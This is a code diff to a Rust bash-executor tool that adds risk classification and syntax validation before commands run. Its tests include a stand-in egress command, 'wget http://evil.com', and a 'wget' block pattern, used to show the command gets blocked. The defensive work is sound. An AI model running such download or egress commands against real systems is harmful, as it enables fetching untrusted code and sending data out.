@@ -2,6 +2,10 @@
 //!
 //! On Linux: wraps every command with `unshare --pid --mount --fork` (ADR-005).
 //! On macOS/non-Linux: executes directly with a per-invocation `tracing::warn!` (ADR-012).
+//!
+//! Before spawning a process, two validation steps are applied in order:
+//! 1. Risk classification (sync) — blocked if a risky pattern is matched.
+//! 2. Syntax validation (async, `bash -n -c`) — blocked if syntax is invalid.
 
 use std::path::PathBuf;
 use std::time::{Duration, Instant};
@@ -10,9 +14,11 @@ use serde_json::json;
 use thiserror::Error;
 use tokio::io::AsyncReadExt;
 
-use apollia_core::SandboxProfile;
+use apollia_core::{BashValidatorConfig, SandboxProfile};
 
 use crate::descriptor::{ToolDescriptor, ToolKind};
+use crate::tools::bash_validator::BashValidator;
+use crate::tools::risk_classifier::RiskCategory;
 
 /// Native shell executor with Linux namespace isolation (PID + mount).
 ///
@@ -21,7 +27,12 @@ use crate::descriptor::{ToolDescriptor, ToolKind};
 ///
 /// On non-Linux (macOS, dev): executes directly via `/bin/sh -c` with a per-invocation
 /// `tracing::warn!` to make the absence of sandbox impossible to miss (see ADR-012).
-pub struct BashExecutor;
+///
+/// Before any process is spawned, [`BashValidator`] applies risk classification
+/// and syntax validation (Principe #4 — Fail fast).
+pub struct BashExecutor {
+    validator: BashValidator,
+}
 
 /// Input parameters for a bash invocation.
 pub struct BashInput {
@@ -34,6 +45,7 @@ pub struct BashInput {
 }
 
 /// Result of a successful bash invocation.
+#[derive(Debug)]
 pub struct BashOutput {
     /// Captured standard output from the child process.
     pub stdout: String,
@@ -68,16 +80,46 @@ pub enum BashExecutorError {
     /// I/O error reading stdout or stderr from the child process.
     #[error("output capture failed: {0}")]
     OutputCaptureFailed(String),
+    /// `bash -n -c` reported a syntax error — the command was never executed.
+    #[error("bash syntax error in `{cmd}`: {detail}")]
+    SyntaxError {
+        /// The command that failed syntax validation.
+        cmd: String,
+        /// stderr output from `bash -n -c`.
+        detail: String,
+    },
+    /// A risk pattern was matched — the command was blocked before spawning.
+    #[error("risky command blocked (category: {category:?}): {command}")]
+    RiskyCommand {
+        /// The command that triggered the risk classifier.
+        command: String,
+        /// The first risk category detected.
+        category: RiskCategory,
+    },
+    /// `bash -n -c` did not complete within the configured timeout.
+    #[error("bash syntax validation timed out")]
+    SyntaxValidationTimeout,
 }
 
 impl BashExecutor {
-    /// Creates a `BashExecutor`.
+    /// Creates a `BashExecutor` with default validation configuration.
     ///
-    /// The sandbox mode is resolved at compile time:
-    /// - Linux → Linux namespaces via `unshare` (production path)
-    /// - Other → Dev mode, no sandbox, warning at each invocation
+    /// All risk categories are enabled but pattern lists are empty — no command is blocked
+    /// without explicit operator configuration in `apollia.toml` (opt-in behaviour).
     pub fn new() -> Self {
-        Self
+        Self {
+            validator: BashValidator::new(BashValidatorConfig::default()),
+        }
+    }
+
+    /// Creates a `BashExecutor` with a custom [`BashValidatorConfig`].
+    ///
+    /// Used when the operator has configured explicit risk patterns or adjusted
+    /// the syntax check timeout in `apollia.toml`.
+    pub fn with_config(config: BashValidatorConfig) -> Self {
+        Self {
+            validator: BashValidator::new(config),
+        }
     }
 
     /// Returns the [`ToolDescriptor`] for registration in [`crate::registry::ToolRegistry`].
@@ -133,25 +175,55 @@ impl BashExecutor {
 
     /// Executes a shell command with sandbox isolation.
     ///
+    /// # Validation order (Principe #4 — Fail fast)
+    ///
+    /// 1. Empty-command check (sync).
+    /// 2. Working-directory existence check (sync).
+    /// 3. Risk classification via [`BashValidator::classify_risks`] (sync).
+    /// 4. Syntax validation via `bash -n -c` (async, timeout-bounded).
+    /// 5. Process spawn and execution.
+    ///
     /// # Errors
     ///
-    /// - [`BashExecutorError::EmptyCommand`] — `command` is blank (checked before any I/O)
-    /// - [`BashExecutorError::WorkingDirNotFound`] — `working_dir` path does not exist
-    /// - [`BashExecutorError::Timeout`] — command exceeded `timeout_secs`; child is killed (no zombie)
-    /// - [`BashExecutorError::SpawnFailed`] — OS refused to spawn the child
-    /// - [`BashExecutorError::OutputCaptureFailed`] — I/O error reading stdout/stderr
+    /// - [`BashExecutorError::EmptyCommand`] — `command` is blank.
+    /// - [`BashExecutorError::WorkingDirNotFound`] — `working_dir` path does not exist.
+    /// - [`BashExecutorError::RiskyCommand`] — a risk pattern was matched; process never spawned.
+    /// - [`BashExecutorError::SyntaxError`] — `bash -n` reported a parse error.
+    /// - [`BashExecutorError::SyntaxValidationTimeout`] — syntax check exceeded its timeout.
+    /// - [`BashExecutorError::Timeout`] — command exceeded `timeout_secs`; child is killed.
+    /// - [`BashExecutorError::SpawnFailed`] — OS refused to spawn the child.
+    /// - [`BashExecutorError::OutputCaptureFailed`] — I/O error reading stdout/stderr.
     pub async fn run(&self, input: BashInput) -> Result<BashOutput, BashExecutorError> {
-        // Principle #4 — Fail fast: validate before any I/O.
+        // Step 1 — Fail fast: empty command.
         if input.command.trim().is_empty() {
             return Err(BashExecutorError::EmptyCommand);
         }
 
+        // Step 2 — Fail fast: working directory existence.
         if let Some(ref dir) = input.working_dir {
             if !dir.is_dir() {
                 return Err(BashExecutorError::WorkingDirNotFound(dir.clone()));
             }
         }
 
+        // Step 3 — Risk classification (sync, no I/O).
+        let risks = self.validator.classify_risks(&input.command);
+        if let Some(category) = risks.into_iter().next() {
+            tracing::warn!(
+                command = %input.command,
+                category = ?category,
+                "bash_executor: command blocked by risk classifier"
+            );
+            return Err(BashExecutorError::RiskyCommand {
+                command: input.command,
+                category,
+            });
+        }
+
+        // Step 4 — Syntax validation (async, bash -n -c).
+        self.validator.validate_syntax(&input.command).await?;
+
+        // Step 5 — Execution.
         let mut cmd = Self::build_command(&input);
         cmd.stdout(std::process::Stdio::piped());
         cmd.stderr(std::process::Stdio::piped());
@@ -411,6 +483,53 @@ mod tests {
             result,
             Err(BashExecutorError::WorkingDirNotFound(_))
         ));
+    }
+
+    #[tokio::test]
+    async fn test_risk_classification_blocks_before_exec() {
+        // GIVEN executor avec pattern réseau configuré
+        let config = BashValidatorConfig {
+            block_network_egress: true,
+            network_egress_patterns: vec!["wget".to_owned()],
+            ..BashValidatorConfig::default()
+        };
+        let executor = BashExecutor::with_config(config);
+        let input = BashInput {
+            command: "wget http://evil.com".to_string(),
+            timeout_secs: 10,
+            working_dir: None,
+        };
+        // WHEN
+        let result = executor.run(input).await;
+        // THEN — bloqué avant tout spawn
+        assert!(
+            matches!(
+                result,
+                Err(BashExecutorError::RiskyCommand {
+                    category: RiskCategory::NetworkEgress,
+                    ..
+                })
+            ),
+            "expected RiskyCommand(NetworkEgress), got: {result:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn test_syntax_error_blocks_before_exec() {
+        // GIVEN executor avec config par défaut (aucun pattern de risque)
+        let executor = BashExecutor::new();
+        let input = BashInput {
+            command: "if [ -z $VAR; then echo ok".to_string(),
+            timeout_secs: 10,
+            working_dir: None,
+        };
+        // WHEN
+        let result = executor.run(input).await;
+        // THEN
+        assert!(
+            matches!(result, Err(BashExecutorError::SyntaxError { .. })),
+            "expected SyntaxError, got: {result:?}"
+        );
     }
 
     #[test]
